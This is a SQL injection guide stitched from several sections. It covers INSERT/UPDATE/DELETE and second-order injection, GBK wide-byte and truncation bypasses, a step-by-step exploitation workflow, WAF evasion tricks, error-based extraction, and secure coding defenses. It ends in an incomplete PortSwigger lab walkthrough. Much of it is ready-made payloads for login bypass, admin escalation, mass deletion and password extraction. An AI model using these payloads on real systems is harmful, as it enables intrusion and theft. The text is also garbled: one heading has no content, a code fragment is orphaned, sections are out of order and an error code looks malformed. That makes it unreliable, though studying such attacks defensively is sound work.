### Level 3: INSERT/UPDATE/DELETE Injection, ORDER BY, Second-Order

**INSERT injection (registration forms, comment boxes):**

Vulnerable pattern: \`INSERT INTO users (username, email) VALUES ('$user', '$email')\`

\`\`\`sql
-- Inject in username field: test', (SELECT password FROM users LIMIT 1))--
-- Result: data extracted via subquery stored in visible field
\`\`\`

**Multi-row INSERT for data exfiltration:**

\`\`\`sql
-- Inject: TEST'),('hacker','coolpass',(SELECT flag FROM flags LIMIT 1))-- -
-- Creates two rows; second row stores extracted data in a visible column
\`\`\`

**UPDATE injection (profile edit, settings):**

Vulnerable pattern: \`UPDATE users SET email='$email' WHERE id=$id\`

\`\`\`sql
-- Inject in email: test@x.com', is_admin=1 WHERE username='attacker'--
-- Result: attacker gets admin privileges
\`\`\`

**DELETE injection:**

Vulnerable pattern: \`DELETE FROM messages WHERE id='$id' AND user='$user'\`

\`\`\`sql
-- Inject in id: 1' OR '1'='1'--
-- Result: ALL messages deleted (tautology + comment removes user check)
\`\`\`

**ORDER BY injection:**

When user input controls sorting, UNION and WHERE clauses are not accepted. Data extraction requires conditional logic:

\`\`\`sql
-- Boolean extraction via sort order change:
ORDER BY (CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'
  THEN name ELSE price END)
-- If first char is 'a', results sort by name; otherwise by price
\`\`\`

**Second-order (stored) SQL injection:**

The payload is stored safely during initial input and fires later when a different function retrieves the data unsafely.

Phase 1 -- Storage (safe): Register with username \`admin'--\`
\`\`\`sql
INSERT INTO users (username, password) VALUES (?, ?)  -- parameterized, safe
-- Stores: admin'--
\`\`\`

Phase 2 -- Trigger (unsafe): Password change retrieves username without parameterization
\`\`\`sql
UPDATE users SET password = 'new_pass' WHERE username = 'admin'--'
-- Effective: UPDATE users SET password = 'new_pass' WHERE username = 'admin'
-- Result: admin's password changed to attacker's chosen value
\`\`\`

### Level 4: GBK/Wide-Byte Bypass, SQL Truncation, Polyglots, ON DUPLICATE KEY

#### GBK / Wide-Byte Bypass

This technique defeats PHP's \`addslashes()\` and \`magic_quotes_gpc\` by exploiting multi-byte character encoding. It is one of the most reliable bypasses against quote-escaping defenses when the database connection uses GBK, Big5, CP932, or SJIS character sets.

**The mechanism -- step by step:**

1. The attacker sends the byte sequence \`%bf%27\` (0xBF followed by 0x27, which is a single quote)
2. PHP's \`addslashes()\` sees the single quote (0x27) and inserts a backslash (0x5C) before it, producing: \`%bf%5c%27\` (0xBF + 0x5C + 0x27)
3. In GBK encoding, the byte pair \`0xBF5C\` forms a valid two-byte Chinese character
4. The database interprets: \`[valid GBK character]'\` -- the backslash has been consumed by the multi-byte character
5. The single quote \`0x27\` is now **unescaped** and breaks out of the string literal
6. SQL injection succeeds despite the escaping

**Why it works:** \`addslashes()\` is encoding-ignorant -- it processes bytes individually. It does not know that 0xBF and the backslash 0x5C together form a valid character in GBK. The database driver, however, is encoding-aware and interprets the bytes as a multi-byte sequence, consuming the backslash.

**Vulnerable character sets:** Any multi-byte encoding where a valid character can end with byte 0x5C (the backslash):
- **GBK** (Chinese Simplified) -- the most commonly exploited
- **Big5** (Chinese Traditional)
- **SJIS** (Japanese Shift-JIS)
- **CP932** (Windows Japanese)
- **EUC-KR** (Korean) -- some sequences

**Alternative prefix bytes:** Any byte where BYTE + 0x5C forms a valid multi-byte character in the target encoding:
- \`0xBF\`, \`0xAF\`, \`0xDF\`, \`0xEF\`, \`0xA1\`, \`0xA8\`, \`0x8C\`

**Prevention:** Use \`mysqli_set_charset('utf8mb4')\` or \`SET NAMES utf8mb4\` at the **driver level** (not via a raw query). The function \`mysql_real_escape_string()\` is charset-aware and will not be tricked, but \`addslashes()\` never is.

**GBK/Wide-Byte payloads:**

\`\`\`sql
%bf%27 OR 1=1--                    -- 0xBF absorbs backslash; quote unescaped
%bf' OR 1=1--                      -- Simplified form
%df%27 OR 1=1--                    -- 0xDF prefix variant (common in the wild)
%af%27 OR 1=1--                    -- 0xAF prefix
%ef%27 OR 1=1--                    -- 0xEF prefix
%a1%27 OR 1=1--                    -- 0xA1 prefix (Big5/GBK)
%a8%27 OR 1=1;-- 2                 -- 0xA8 prefix with semicolon
%8C%A8%27 OR 1=1-- 2               -- Three-byte prefix variant
\`\`\`

#### SQL Truncation Attack

SQL truncation exploits a mismatch between application input validation and database column length constraints. When MySQL operates in non-strict SQL mode, it silently truncates strings that exceed the column's VARCHAR(N) limit, and ignores trailing spaces during string comparison.

**The mechanism -- step by step:**

1. Database schema: \`username VARCHAR(20) NOT NULL UNIQUE\`
2. Attacker checks: "admin" exists -- registration blocked
3. Attacker registers as: \`admin               x\` (admin + 15 spaces + 'x' = 21 characters)
4. Application SELECT check: \`WHERE username = 'admin               x'\` -- no match found, registration proceeds
5. Database INSERT: truncates to 20 characters: \`admin               \` (admin + 15 trailing spaces)
6. MySQL comparison quirk: \`'admin' = 'admin   '\` returns **TRUE** (trailing spaces ignored in comparison)
7. Result: two rows effectively match "admin" -- the attacker can now authenticate as admin or hijack password reset

**Prerequisites:**
- MySQL with \`sql_mode\` NOT including \`STRICT_TRANS_TABLES\` or \`STRICT_ALL_TABLES\`
- Application performs a SELECT uniqueness check before INSERT (rather than relying on database UNIQUE constraint error handling)
- Column has a defined VARCHAR(N) length limit
- Application does not trim input before the uniqueness comparison

**Database behavior comparison:**

| Database | VARCHAR Truncation | Trailing Space Comparison |
|----------|-------------------|--------------------------|
| MySQL (non-strict) | Silent truncation | Ignores trailing spaces |
| MySQL (strict) | ERROR 1406 | Ignores trailing spaces |
| PostgreSQL | ERROR (value too long) | Spaces significant |
| MSSQL | Silent truncation | Ignores trailing spaces |
| Oracle | ERROR ORA-12899 | Spaces significant in CHAR |
| SQLite | No length limit on TEXT | N/A |

**MySQL UTF-8 4-byte truncation variant:** When MySQL encounters a 4-byte UTF-8 character (like an emoji) in a \`utf8\` (which is actually \`utf8mb3\`, 3-byte max) column, it truncates the string at that point. Input \`admin<4-byte-emoji>anything_after\` truncates to \`admin\`. Prevention: use \`utf8mb4\` instead of \`utf8\`.

**Historical CVE:** CVE-2008-4106 (WordPress) -- admin account takeover via SQL truncation in the \`user_login\` column.

**SQL truncation payloads:**

### Level 5: Protocol-Level Smuggling, WAFFLED, Isomorphic Statements

**Protocol-level SQL query smuggling (DEF CON 32, 2024):**

Researcher Paul Gerste demonstrated that instead of attacking SQL query syntax, attackers can corrupt the binary wire protocol between the application and database to inject entire SQL statements.

CVE-2024-27304 (pgx Go PostgreSQL driver, CVSS 9.8): Protocol message sizes are tracked as 32-bit integers. By embedding a string that causes the length counter to overflow past 2^32, the driver splits what should be a single protocol message into multiple messages. The attacker controls the second message, enabling injection of arbitrary SQL including full DML/DDL and authentication bypass. Exploitation vectors include WebSocket connections (bypassing HTTP body limits), compressed payloads that decompress to >4GB, or aggregating multiple parameters past the overflow threshold.

Related CVEs: CVE-2024-27289 (pgx v4), GHSA-XMRP-424F-VFPX (SQLx), GHSA-WQ9X-QWCQ-MMGF (Diesel ORM).

**WAFFLED research (IEEE 2025):**

Akhavani, Jabiyev et al. discovered 1,207 confirmed WAF bypasses across AWS WAF, Azure WAF, Google Cloud Armor, Cloudflare, and ModSecurity using parsing discrepancies between WAFs and web frameworks. Techniques include RFC 2231 boundary continuation (WAF and framework interpret different boundaries), duplicate Content-Type headers, malformed multipart boundaries, and charset manipulation. Over 90% of production web forms accept \`multipart/form-data\` even when expecting \`application/x-www-form-urlencoded\`.

**Isomorphic SQL statements (Spaceraccoon):**

Use pairs of functionally equivalent but syntactically different SQL expressions to detect injection incrementally without triggering WAF signatures:

\`\`\`sql
-- These pairs should produce identical results on a vulnerable parameter:
ABS(0)     vs  ABS(1)       -- Different if SQL evaluated
COS(0)     vs  COS(1)       -- cos(0)=1, cos(1)=0.54; difference confirms eval
POWER(1,1) vs  POWER(1,0)   -- Both return 1; proves evaluation without alarm
\`\`\`

## Exploitation

### 10-Step Exploitation Workflow

**Step 1: Detect injection point.** Submit \`'\` and \`"\` to every input vector. Look for SQL errors, page layout changes, or behavioral differences.

**Step 2: Confirm with boolean pairs.** Submit \`' AND 1=1--\` (true) and \`' AND 1=2--\` (false). Different responses confirm injection.

**Step 3: Determine context.** Test single quote, double quote, numeric, and parenthesized contexts. Identify which comment syntax works (reveals database type).

**Step 4: Bypass authentication.** For login forms: \`admin'--\` in the username field. For data filters: \`' OR 1=1--\` to dump all records.

**Step 5: Enumerate database.** Identify the DBMS using fingerprinting queries. Determine database version, current user, current database name.

\`\`\`sql
-- MySQL:   SELECT @@version, USER(), DATABASE()
-- PGSQL:   SELECT version(), current_user, current_database()
-- MSSQL:   SELECT @@VERSION, SUSER_SNAME(), DB_NAME()
-- Oracle:  SELECT banner FROM v$version WHERE ROWNUM=1
-- SQLite:  SELECT sqlite_version()
\`\`\`

**Step 6: Extract schema.** Enumerate tables and columns through the identified database's metadata system.

\`\`\`sql
-- MySQL/PGSQL/MSSQL: SELECT table_name FROM information_schema.tables
-- Oracle:            SELECT table_name FROM all_tables
-- SQLite:            SELECT name FROM sqlite_master WHERE type='table'
\`\`\`

**Step 7: Extract sensitive data.** Target user tables, credential stores, configuration tables, API keys, personal data.

**Step 8: Escalate privileges.** Via stacked queries, modify your own account's role/permissions in the database.

\`\`\`sql
'; UPDATE users SET role='admin' WHERE username='attacker'--
\`\`\`

**Step 9: Establish persistence.** Create a backdoor account, plant second-order payloads, or write a web shell (SQLite/MSSQL).

**Step 10: Document evidence.** Capture HTTP requests/responses, screenshots, database output. Prepare for responsible disclosure.

### WAF Bypass Techniques (20+)

**1. Whitespace alternatives:**

| Byte | Hex | Description | DB Support |
|------|-----|-------------|------------|
| Tab | \`%09\` | Horizontal tab | All |
| Newline | \`%0a\` | Line feed | All |
| Vertical tab | \`%0b\` | Vertical tab | MySQL, MSSQL |
| Form feed | \`%0c\` | Form feed | MySQL, MSSQL |
| Carriage return | \`%0d\` | CR | All |
| Non-breaking space | \`%a0\` | NBSP | MySQL |
| Inline comment | \`/**/\` | Comment as whitespace | All |
| Parentheses | \`()\` | Grouping eliminates spaces | All |

**2. Case mixing:** \`SeLeCt\`, \`UnIoN\`, \`oR\`, \`aNd\` -- SQL keywords are case-insensitive but signature-based WAFs may use case-sensitive matching.

**3. Keyword doubling:** \`UNunionION SEselectLECT\` -- WAF strips inner keyword once, leaving valid outer keyword.

**4. MySQL versioned comments:** \`/*!50000UNION*/ /*!50000SELECT*/\` -- code inside \`/*!NNNNN */\` runs only on MySQL >= version NNNNN but WAFs do not parse it.

**5. URL encoding (single/double/triple):** Single: \`%27%20OR%201%3D1--\`. Double: \`%2527%2520OR%25201%253D1--\`. Triple: \`%252527\`.

**6. Hex encoding for strings:** \`WHERE username=0x61646D696E\` eliminates quotes entirely (MySQL).

**7. CHAR/CHR functions:** \`CHAR(97,100,109,105,110)\` for MySQL/MSSQL, \`CHR(97)||CHR(100)||CHR(105)||CHR(110)\` for PostgreSQL/Oracle.

**8. Null byte injection:** \`%00' OR 1=1--\` -- C-based WAFs stop at null byte; backend processes full string.

**9. JSON-based bypass (Team82, 2022):** JSON operators (\`JSON_EXTRACT\`, \`::jsonb <@\`, \`->\`) bypassed AWS WAF, Cloudflare, Palo Alto, F5, and Imperva.

**10. Content-Type manipulation:** Send JSON body when WAF expects form-encoded, or XML with entity-encoded SQL keywords (\`&#x53;ELECT\` decodes to \`SELECT\` after XML parsing).

**11. HTTP Parameter Pollution (HPP):** Split injection across duplicate parameters: \`?id=1/*&id=*/OR/*&id=*/1=1--\`. Server concatenates; WAF inspects individually.

**12. Chunked Transfer Encoding:** Split HTTP body into chunks so WAF sees incomplete fragments.

**13. Scientific notation:** \`1e0OR'1'='1'--\` -- confuses libinjection tokenizer.

**14. Operator substitution:** \`||\` for OR, \`&&\` for AND, \`LIKE\` for \`=\`, \`BETWEEN\` for \`>\`, \`REGEXP\` for \`=\`.

**15. Backtick/bracket identifiers:** MySQL: \`\` \`union\` \`select\` 1,2,3-- \`\`. MSSQL: \`[union] [select] 1,2,3--\`.

**16. Backslash trick (fragmented injection):** Username: \`\\\`. Password: \` OR 1=1#\`. The backslash escapes the closing quote, making \`' AND pass='\` a single string literal, and the OR condition runs.

**17. Overlong payloads:** Exceed WAF inspection buffer (8KB-128KB depending on vendor) with junk data prefix.

**18. WAFFLED multipart/form-data:** Exploit RFC 2231 boundary continuation; WAF parses one boundary, framework parses another.

**19. XML entity encoding:**

<storeId>&#x31;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x31;</storeId>
<!-- Decodes to: 1 OR 1=1 -->

## Variations and Edge Cases

### String vs. Numeric Context

String context (\`WHERE name = '$input'\`) requires quote breakout (\`'\`). Numeric context (\`WHERE id = $input\`) requires no quotes -- inject directly. Test both: \`1 AND 1=1\` (numeric) and \`1' AND '1'='1\` (string). If neither triggers, try double-quote: \`1" AND "1"="1\`.

### Single-Quote vs. Double-Quote vs. Backtick

MySQL accepts both \`'string'\` and \`"string"\` (unless \`ANSI_QUOTES\` is set). PostgreSQL and Oracle use \`"\` for identifiers only. Test all three: \`'\`, \`"\`, \`\` \` \`\`.

### Stored Procedure Context

Stored procedures using dynamic SQL (\`EXEC(@sql)\` in MSSQL, \`EXECUTE ... USING\` in PostgreSQL) inherit the vulnerability of whatever string concatenation occurs inside them.

### JSON/XML Body Context

Modern APIs pass input as JSON values. Classic payloads work identically inside JSON strings:

\`\`\`json
{"username": "admin'--", "password": "x"}
\`\`\`

XML bodies can use entity encoding to hide payloads from WAFs:

\`\`\`xml
<user>admin&#x27;--</user>
\`\`\`

### Implicit Type Coercion (MySQL)

MySQL silently converts strings to numbers in numeric context. \`'abc' = 0\` returns TRUE because the non-numeric string converts to 0. This enables tautologies without traditional OR syntax:

\`\`\`sql
' OR 'abc'=0--    -- TRUE because string 'abc' converts to integer 0
\`\`\`

User.objects.raw("SELECT * FROM users WHERE name='%s'" % user_input)

# extra() with string formatting -- VULNERABLE
User.objects.extra(where=["name='%s'" % user_input])
\`\`\`

**Safe pattern:** Use the ORM's query API with parameterized arguments: \`User.objects.filter(name=user_input)\`.

**CVE-2024-42005:** SQL injection in Django \`QuerySet.values()\` and \`values_list()\` on models with \`JSONField\`. Crafted JSON key used as an argument enables injection into column aliases.

### Rails (Ruby)

**Vulnerable patterns:**

\`\`\`ruby
# String interpolation in where -- VULNERABLE
User.where("name = '#{params[:name]}'")

# order() with user input -- VULNERABLE
User.order(params[:sort])
\`\`\`

**Safe pattern:** \`User.where(name: params[:name])\` or \`User.where("name = ?", params[:name])\`.

### Express / Node.js (JavaScript)

**Vulnerable patterns (Sequelize, TypeORM, raw queries):**

\`\`\`javascript
// String template in raw query -- VULNERABLE
db.query(\`SELECT * FROM users WHERE username = '\${req.body.username}'\`);
\`\`\`

**Safe pattern:** \`db.query('SELECT * FROM users WHERE username = ?', [req.body.username])\`.

### Spring (Java)

**Vulnerable patterns:**

\`\`\`java
// String concatenation -- VULNERABLE
String query = "SELECT * FROM users WHERE name = '" + input + "'";
statement.executeQuery(query);
\`\`\`

**Safe pattern:** \`PreparedStatement\` with \`?\` placeholders.

### Laravel (PHP)

**Vulnerable patterns:**

\`\`\`php
// Raw DB query with interpolation -- VULNERABLE
DB::select("SELECT * FROM users WHERE name = '$input'");
\`\`\`

**Safe pattern:** \`User::where('name', $input)->get()\` or \`DB::select('SELECT * FROM users WHERE name = ?', [$input])\`.

### Cloud/Serverless Considerations

- AWS Lambda functions connecting to RDS still require parameterized queries
- Serverless frameworks do not add SQL injection protection
- Cloud WAFs (AWS WAF, Cloudflare, Azure WAF) provide a defense layer but are bypassable (Team82, WAFFLED research)
- GraphQL resolvers on Lambda/Cloud Functions are equally vulnerable when building raw SQL

### SPA/API Architecture

Single-page applications communicate exclusively through API calls. Every API endpoint accepting user input and touching a database is a potential injection point. The separation of frontend and backend does not reduce risk -- the backend still concatenates strings if developers use raw queries. Test JSON body parameters, query parameters, path parameters, and headers.

## Defensive Countermeasures

### Primary Defense: Parameterized Queries (Prepared Statements)

Separates SQL structure from data. The query template is a constant string with \`?\` placeholders. User input binds to placeholders as typed data, never as SQL syntax.

**Java:**

\`\`\`java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet results = pstmt.executeQuery();
\`\`\`

**Python (psycopg2):**

\`\`\`python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password))
\`\`\`

**PHP (PDO):**

\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
\`\`\`

**Node.js (mysql2):**

\`\`\`javascript
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
\`\`\`

**C# (.NET):**

\`\`\`csharp
string query = "SELECT * FROM users WHERE username = @user AND password = @pass";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@user", username);
cmd.Parameters.AddWithValue("@pass", password);
\`\`\`

**Limitation:** Parameterized queries protect **values** only. Table names, column names, ORDER BY clauses, and SQL keywords cannot be parameterized. For those, use allow-list validation.

### Secondary Defenses

**Allow-list input validation (for non-parameterizable elements):**

\`\`\`java
// ORDER BY direction -- map to boolean
String direction = sortAsc ? "ASC" : "DESC";

// Table name -- switch/map to known values
switch(param) {
    case "users": tableName = "users"; break;
    case "orders": tableName = "orders"; break;
    default: throw new ValidationException("Invalid table");
}
\`\`\`

**Stored procedures** -- safe only if they use parameterized queries internally. Dynamic SQL (\`EXEC(@sql)\`) inside a stored procedure is still vulnerable.

**Least privilege** -- database accounts should have minimum necessary permissions. Never run web applications as \`db_owner\`, \`DBA\`, or \`root@%\`.

**Error message suppression** -- never display raw SQL errors to users. Log details server-side; show generic error pages to clients.

### What Does NOT Work

| Ineffective Defense | Why It Fails |
|-------------------|--------------|
| \`addslashes()\` / \`magic_quotes\` | Bypassed by GBK/wide-byte injection |
| Denylist keyword filtering | Bypassed by encoding, case mixing, comments, operator substitution |
| Character escaping alone | Database-specific, fragile, repeatedly bypassed |
| Stored procedures with dynamic SQL | String concatenation inside procedures is still vulnerable |
| Client-side validation only | Trivially bypassed with Burp/curl |
| WAFs as sole defense | 1,207 bypasses found by WAFFLED research alone |

## Overview

Error-based SQL injection is a data exfiltration technique where the attacker forces the database to produce error messages that contain the results of injected subqueries. The database error message itself is the data channel. Instead of reading query results from a normal page output (as in classic in-band SQLi) or from an appended UNION SELECT (as in union-based), the attacker constructs a subquery inside a function that is designed to fail, and the resulting error text embeds the subquery's return value. The attacker reads the extracted data directly from the error string rendered in the HTTP response, an API error field, an HTML comment, or a JavaScript snippet.

The mechanism relies on a two-part chain. First, CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) must be present: the application concatenates user input into a SQL query without parameterization, allowing the attacker to inject arbitrary SQL syntax. Second, CWE-209 (Generation of Error Message Containing Sensitive Information) must be present: the application returns verbose database error messages to the user rather than a generic error page. Without CWE-209, the error messages never reach the attacker and the technique fails -- though the underlying injection vulnerability remains exploitable via blind or time-based methods.

Error-based SQLi encompasses two distinct sub-techniques that operate on fundamentally different data channels:

**Direct error extraction** forces a function call that always fails, and the failure message contains the queried data verbatim. For example, \`CAST((SELECT password FROM users LIMIT 1) AS int)\` on PostgreSQL produces \`ERROR: invalid input syntax for type integer: "s3cr3t_p4ssw0rd"\`. The password appears directly in the error text. One HTTP request extracts many characters at once, limited only by the error function's output capacity (32 characters for MySQL EXTRACTVALUE, up to 8000 for MSSQL CONVERT). This is fast -- comparable in speed to UNION-based extraction.

**Conditional error oracle** uses \`CASE WHEN\` expressions to control whether an error occurs. If a boolean condition is true, a division-by-zero or overflow triggers an error. If false, no error occurs. The attacker observes the binary signal (error vs. no-error, typically HTTP 500 vs. HTTP 200) and infers data one bit at a time through iterative character-by-character extraction with binary search. This is slow -- requiring approximately 7 requests per character -- but works even when the application returns generic error pages without database error detail, as long as any observable behavioral difference exists between error and non-error states.

The distinction matters for exploitation strategy: direct error extraction is preferred when verbose errors are visible (fast, minimal request count), while the conditional error oracle is the fallback when error messages are suppressed but error states are still detectable (slower, but works through custom error pages). Both techniques share the same root cause (SQL injection plus error exposure) and the same remediation path (parameterized queries plus error suppression), but they operate at different speeds and have different detection profiles.

Error-based SQLi is classified under CWE-89 (SQL Injection) as the injection mechanism and CWE-209 (Error Message Information Disclosure) as the enabling condition. CAPEC-7 covers the error oracle variant. OWASP maps it to A05:2025 (Security Misconfiguration, covering verbose error messages) in addition to A03:2021 (Injection). CVSS base scores for exploitable error-based SQLi consistently reach 9.8 Critical when unauthenticated, as demonstrated by CVE-2023-34362 (MOVEit Transfer, 9.8), CVE-2024-1071 (Ultimate Member, 9.8), CVE-2024-42005 (Django, 9.8 CISA-ADP), and CVE-2023-48788 (FortiClient EMS, 9.8).

## Understanding From Zero

### Analogy

Imagine you walk into a library and ask the librarian: "Please find me the book titled \`CAST((SELECT secret_diary FROM vault) AS integer)\`." The librarian does not understand what you asked for -- it is not a valid book title -- so she starts to explain the error. But instead of simply saying "Not found," she reads back exactly what she tried to look up: "I could not convert 'Dear Diary, the combination is 41-23-07' to an integer shelf number." She accidentally read out the entire content of the secret diary while explaining why your request was invalid. The error message contains the answer.

That is error-based SQL injection. You ask the database a deliberately malformed question. The database tries to process it, fails, and in explaining the failure, reveals the data you were after. The error message IS the extraction channel.

### Vulnerable Code

\`\`\`php
// PHP: user input concatenated into query, errors displayed
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = " . $id;
$result = mysqli_query($conn, $query);
if (!$result) {
    echo "Database error: " . mysqli_error($conn);  // CWE-209: error exposed to user
}
\`\`\`

### What the Attacker Submits

\`\`\`
GET /product?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))
\`\`\`

### What the Database Executes

\`\`\`sql
SELECT * FROM products WHERE id = 1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))
\`\`\`

The \`EXTRACTVALUE\` function expects a valid XPath expression. \`CONCAT(0x7e, 's3cr3t_p4ssw0rd')\` produces \`~s3cr3t_p4ssw0rd\`, which is not valid XPath. MySQL generates:

\`\`\`
XPATH syntax error: '~s3cr3t_p4ssw0rd'
\`\`\`

The application displays this error to the user. The password is now visible.

### Why the Application Shows Errors

Applications display raw database errors because of:

1. **Development configuration left in production** -- \`display_errors = On\` in PHP, \`DEBUG = True\` in Django, \`<customErrors mode="Off"/>\` in ASP.NET
2. **Catch blocks that expose exception messages** -- \`catch (SQLException e) { response.getWriter().println(e.getMessage()); }\`
3. **Framework default behavior** -- many frameworks show detailed errors in development mode, and developers forget to switch to production mode
4. **API responses with error detail** -- JSON APIs often include \`{"error": "SQL error: ..."}\` fields containing raw database output
5. **Error messages hidden in HTML comments or JavaScript** -- not visible on the rendered page but present in the response source

### Concrete Impacts

| Impact | How Error-Based SQLi Achieves It |
|--------|----------------------------------|
| **Full database extraction** | Direct error functions leak credentials, PII, financial data, session tokens -- one value per request |
| **Schema discovery** | Error messages reveal table names, column names, database version, server name |
| **Authentication bypass** | Extract admin password hashes, then crack them offline |
| **Privilege escalation** | Extract database admin credentials, API keys, or encryption keys stored in DB |
| **Remote code execution** | Chain with stacked queries for \`xp_cmdshell\` (MSSQL) or \`INTO OUTFILE\` (MySQL) |
| **Lateral movement** | Extracted credentials for database accounts often reused across systems |

### Primary Injection Points

| Vector | Example | Risk Level |
|--------|---------|------------|
| URL query parameter | \`?id=1\`, \`?product=42\`, \`?category=3\` | High |
| POST body field | \`username=admin\`, \`login_email=test@test.com\` | High |
| Cookie value | \`Cookie: TrackingId=abc123; session=xyz\` | High |
| HTTP header | \`User-Agent\`, \`Referer\`, \`X-Forwarded-For\` | Medium-High |
| REST API parameter | \`/api/v1/users/123\`, JSON body \`{"user_id": 1}\` | High |
| Sort/order parameter | \`?sort=name&dir=asc\` | Medium |
| Search/filter field | \`?q=keyword\`, \`?filter[status]=active\` | High |
| XML/SOAP body | \`<productId>1</productId>\` | Medium |
| GraphQL argument | \`query { user(id: "1") { name } }\` | Medium-High |

### Error Exposure Points

Error messages may appear in locations beyond the obvious response body:

- **HTTP response body** -- the most common; raw error string in the HTML
- **HTML source comments** -- \`<!-- Error: XPATH syntax error: '~admin~' -->\` hidden from visual rendering
- **JavaScript variables** -- \`var error = "Conversion failed when converting..."\` in embedded scripts
- **JSON API error fields** -- \`{"status": "error", "message": "invalid input syntax for integer: 'admin'"}\` in API responses
- **HTTP response headers** -- \`X-Debug-Error: ORA-292257: host SCOTT unknown\` in custom headers
- **Server log files** -- accessible via path traversal, LFI, or misconfigured log viewers
- **Framework debug pages** -- Django debug page, Laravel Ignition, ASP.NET Yellow Screen of Death

### Signals That Error-Based Extraction Is Possible

1. Submitting a single quote (\`'\`) returns a database error message containing SQL syntax details
2. Submitting a string where a number is expected triggers a type conversion error with the original value visible
3. The HTTP response code changes from 200 to 500 when SQL syntax is broken
4. Error pages contain database-specific keywords: \`MySQL\`, \`ORA-\`, \`Conversion failed\`, \`ERROR: invalid input syntax\`, \`XPATH syntax error\`
5. Submitting \`AND 1=1\` behaves normally while \`AND 1=2\` behaves differently (confirms injection exists)

## How It Works

### Mechanism Flow

\`\`\`mermaid
sequenceDiagram
    participant A as Attacker
    participant W as Web Application
    participant D as Database

    A->>W: Inject subquery inside error function<br/>id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))
    W->>D: Execute modified SQL query
    D->>D: Evaluate subquery: SELECT user() = 'root@localhost'
    D->>D: EXTRACTVALUE tries XPath: '~root@localhost'
    D->>D: XPath parsing FAILS (invalid expression)
    D-->>W: Error: "XPATH syntax error: '~root@localhost'"
    W-->>A: HTTP response contains error message
    A->>A: Read 'root@localhost' from error text
\`\`\`

### Direct Error Extraction Flow (Data IN the Error)

\`\`\`
1. Attacker crafts payload:    AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))
2. Database evaluates subquery: SELECT password FROM users LIMIT 1  -->  "s3cr3t"
3. CONCAT produces:             "~s3cr3t"
4. EXTRACTVALUE tries XPath:    EXTRACTVALUE(1, "~s3cr3t")  -->  FAILS (invalid XPath)
5. Error message generated:     "XPATH syntax error: '~s3cr3t'"
6. Application sends error:     HTTP 500 with error message in response body
7. Attacker reads:              "s3cr3t" directly from the error text
\`\`\`

### Conditional Error Oracle Flow (Error/No-Error as Boolean Signal)

\`\`\`
1. Attacker crafts payload:    AND CASE WHEN (SUBSTR(password,1,1)='s') THEN TO_CHAR(1/0) ELSE '' END
2. Database evaluates SUBSTR:   First char of password = 's' --> condition is TRUE
3. THEN branch executes:        TO_CHAR(1/0) --> division by zero --> ORA-01476 error
4. Application returns:         HTTP 500 (error state)
5. Attacker concludes:          First character IS 's'

Next request:
1. Attacker changes test:      AND CASE WHEN (SUBSTR(password,1,1)='t') THEN TO_CHAR(1/0) ELSE '' END
2. Database evaluates:          First char = 's', not 't' --> condition is FALSE
3. ELSE branch executes:        '' --> no error
4. Application returns:         HTTP 200 (normal state)
5. Attacker concludes:          First character is NOT 't'
\`\`\`

## Detection and Validation

### Step 1: Identify Injection Point

Submit values that break SQL syntax and observe the response.

| Probe | Expected Response (if vulnerable) |
|-------|-----------------------------------|
| \`'\` | Database error mentioning unclosed quote or syntax error |
| \`''\` | No error (escaped quote; confirms string context) |
| \`1/0\` | Division by zero error (numeric context) |
| \`1 AND 1=1\` | Normal response |
| \`1 AND 1=2\` | Different response (confirms boolean evaluation) |

### Step 2: Fingerprint the Database via Error Messages

Each database produces distinctive error signatures:

**MySQL:**
\`\`\`
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
\`\`\`

**MSSQL:**
\`\`\`
Conversion failed when converting the nvarchar value '...' to data type int.
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
\`\`\`

**PostgreSQL:**
\`\`\`
ERROR: invalid input syntax for type integer: "..."
ERROR: unterminated quoted string at or near "'"
\`\`\`

**Oracle:**
\`\`\`
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
ORA-19202: Error occurred in XML processing
ORA-292257: host ... unknown
\`\`\`

**SQLite:**
\`\`\`
near "...": syntax error
\`\`\`

### Step 3: Confirm Error-Based Extraction

Test with a simple error function to verify data appears in the error message:

\`\`\`sql
-- MySQL
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))
-- Expected: XPATH syntax error: '~5.7.33~'

-- MSSQL
AND 1=CONVERT(int,@@version)
-- Expected: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.

-- PostgreSQL
AND 1=CAST((SELECT version()) AS int)
-- Expected: invalid input syntax for type integer: "PostgreSQL 16.2..."

-- Oracle
AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))
-- Expected: DRG-11701: thesaurus Oracle Database 11g... does not exist
\`\`\`

### Lab: Visible Error-Based SQL Injection (PortSwigger -- PRACTITIONER)

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

**Scenario:** The application uses a \`TrackingId\` cookie in SQL queries and displays verbose PostgreSQL error messages.

**Target:** Extract the \`administrator\` password from the \`users\` table.

**Step 1: Trigger an initial error to reveal query structure.**

\`\`\`
TrackingId=abc'
\`\`\`

The verbose error reveals: \`ERROR: unterminated quoted string at or near "'abc'"\` and shows the full query: \`SELECT * FROM tracking WHERE id = 'abc''\`.

**Step 2: Close the syntax with a comment.**

\`\`\`
TrackingId=abc'--
\`\`\`

No error. The \`--\` comments out the trailing single quote.

**Step 3: Introduce a CAST subquery.**

\`\`\`
